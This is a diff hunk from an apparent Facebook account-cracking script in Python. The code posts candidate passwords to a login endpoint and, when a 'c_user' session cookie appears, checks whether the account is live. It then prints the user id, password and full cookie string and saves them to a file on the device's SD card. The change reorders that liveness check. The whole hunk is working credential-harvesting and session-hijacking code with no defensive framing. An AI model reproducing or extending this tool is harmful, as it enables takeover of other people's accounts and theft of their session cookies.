@@ -167,14 +167,14 @@ def host(uid, pwx, meth, fb):
             session.post(url=url, data=info, headers=had)
             heron_brand = session.cookies.get_dict().keys()
             if "c_user" in heron_brand:
-                if live_check(uid) == "live":
                     coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                     xx = coki.split("c_user=")[1]
                     xd = xx[:15].replace(";", "  ")
-                    print(f"\r\r[SUCCESSFUL] {xd} <> {ps}\n[Cookies]{coki}")
-                    open("/sdcard/SHADID-OK.txt", "a").write(xd + "|" + ps + "|" + coki + "\n")
-                    break
-                else:pass
+                    if live_check(xd) == "live":
+                        print(f"\r\r[SUCCESSFUL] {xd} <> {ps}\n[Cookies]{coki}")
+                        open("/sdcard/SHADID-OK.txt", "a").write(xd + "|" + ps + "|" + coki + "\n")
+                        break
+                    else:pass
             elif "checkpoint" in heron_brand:
                 pass
 
